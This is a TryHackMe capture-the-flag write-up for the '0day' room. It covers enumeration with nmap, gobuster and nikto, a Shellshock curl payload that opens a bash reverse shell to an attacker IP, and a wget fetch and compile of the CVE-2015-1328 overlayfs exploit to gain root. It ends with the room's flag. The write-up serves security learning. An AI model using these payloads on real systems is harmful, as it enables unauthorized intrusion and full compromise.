# TryHackMe Writeup - 0day: *“Exploit Ubuntu, like a Turtle in a Hurricane”*

## Room Information

* **Room Name:** 0day - Exploit Ubuntu, like a Turtle in a Hurricane
* **Platform:** TryHackMe
* **Difficulty:** Medium
* **Goal:** Gain initial access via web exploitation and escalate privileges using a kernel exploit (CVE-2015-1328)

---

# 1. Reconnaissance (Nmap Scan)

We start with a full port scan to identify open services.

```bash
nmap -sV -sC -Pn -p- 10.48.153.37 -oN scan_results
```

### Explanation of flags:

* `-sV` → Detect service versions
* `-sC` → Run default scripts
* `-Pn` → Skip host discovery (assume host is up)
* `-p-` → Scan all 65535 ports
* `-oN` → Save output to file

### Result Summary:

| Port | Service | Version               |
| ---- | ------- | --------------------- |
| 22   | SSH     | OpenSSH 6.6.1p1       |
| 80   | HTTP    | Apache 2.4.7 (Ubuntu) |

👉 Only HTTP (port 80) is accessible for initial exploitation.

---

# 2. Web Enumeration (Gobuster)

We enumerate hidden directories using Gobuster:

```bash
gobuster dir -u http://10.48.153.37 -w /usr/share/wordlists/dirb/common.txt
```

### Explanation:

* `dir` → directory brute-force mode
* `-u` → target URL
* `-w` → wordlist

### Important findings:

```
/admin
/backup
/cgi-bin
/secret
/uploads
/robots.txt
```

👉 `/cgi-bin/` is especially interesting (possible command execution)

---

# 3. Web Vulnerability Scan (Nikto)

```bash
nikto -h http://10.48.153.37
```

### Findings:

* Outdated Apache server
* CGI directory enabled
* Security headers missing
* `/backup/` and `/secret/` flagged as interesting

👉 Focus shifts to `/cgi-bin/`

---

# 4. Initial Access (Shellshock Exploitation)

The `/cgi-bin/` directory is vulnerable to **Shellshock (CVE-2014-6271)**.

We exploit it using a malicious HTTP request.

## Attack Command:

```bash
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.48.73.83/4444 0>&1" \
http://10.48.153.37/cgi-bin/test.cgi
```

---

## Explanation:

This payload:

* Injects malicious function into Bash environment
* Executes reverse shell to attacker machine

---

# 5. Start Netcat Listener

On attacker machine:

```bash
nc -nlvp 4444
```

### Result:

We receive a reverse shell as:

```
www-data
```

👉 We now have initial access to the server.

---

# 6. Post Exploitation (User Flag)

After gaining shell access:

```bash
whoami
```

Output:

```
www-data
```

Find user flag:

```bash
cat /home/www-data/user.txt
```

✔ User flag obtained.

---

# 7. System Enumeration

We check system details:

```bash
uname -a
```

### Output shows:

* Linux kernel: **3.13.0**
* Ubuntu version: outdated

👉 This kernel is vulnerable to:

```
CVE-2015-1328 (overlayfs privilege escalation)
```

---

# 8. Privilege Escalation (Kernel Exploit)

We download exploit from Exploit-DB:

```bash
wget http://10.48.73.83:8000/37292.c
```

---

## Compile Exploit

```bash
gcc 37292.c -o exploit
```

### ⚠ Problem encountered:

```
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

---

## Fix PATH Issue

The environment PATH is broken.

Check PATH:

```bash
echo $PATH
```

Fix it:

```bash
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
```

---

## Recompile:

```bash
gcc 37292.c -o exploit
```

---

## Run Exploit:

```bash
./exploit
```

---

# 9. Root Access

After execution:

```bash
whoami
```

Output:

```
root
```

👉 We successfully escalated privileges to root.

---

# 10. Root Flag

Find root flag:

```bash
find / -type f -name root.txt 2>/dev/null
```

Read it:

```bash
cat /root/root.txt
```

---

### Root Flag:

```
THM{g00d_j0b_0day_is_Pleased}
```

---

# Summary of Attack Path

```
Nmap Scan
    ↓
Gobuster + Nikto Enumeration
    ↓
Find /cgi-bin/
    ↓
Shellshock Exploit (Reverse Shell)
    ↓
User Access (www-data)
    ↓
Kernel Version Check
    ↓
CVE-2015-1328 Exploit
    ↓
Root Access
    ↓
Capture root.txt
```

---

# Key Learnings

* Always enumerate hidden directories (`/cgi-bin`, `/backup`)
* CGI scripts can lead to Shellshock vulnerability
* Always check kernel version for privilege escalation
* PATH misconfiguration can break compilation
* Old Linux kernels are often vulnerable to public exploits

---

# Final Notes

This room demonstrates how:

* A simple web vulnerability (Shellshock)
* Combined with an outdated kernel
* Can lead to full system compromise

👉 Always keep systems updated and disable unused CGI services.

---

# End of Writeup 🎯
